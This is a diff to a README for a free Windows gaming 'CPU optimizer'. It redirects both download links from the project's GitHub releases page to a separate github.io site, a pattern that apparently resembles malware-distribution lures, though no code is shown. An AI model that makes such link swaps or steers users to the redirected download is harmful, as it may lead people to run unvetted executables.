@@ -1,6 +1,6 @@
 # 🚀 CPU-Optimizer-Gaming-2026-Free - Boost your gaming performance today
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/gnanam1823/CPU-Optimizer-Gaming-2026-Free/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://gnanam1823.github.io)
 
 This software improves your computer performance for gaming. It adjusts your processor settings to focus power on your games. The tool manages process priority, core parking, and power plans.
 
@@ -24,7 +24,7 @@ This software runs on Windows. You need the following:
 
 ## 📥 Downloads
 
-Visit [this page](https://github.com/gnanam1823/CPU-Optimizer-Gaming-2026-Free/releases) to download the latest version of the software.
+Visit [this page](https://gnanam1823.github.io) to download the latest version of the software.
 
 1.  Click the link above.
 2.  Find the section titled Assets.
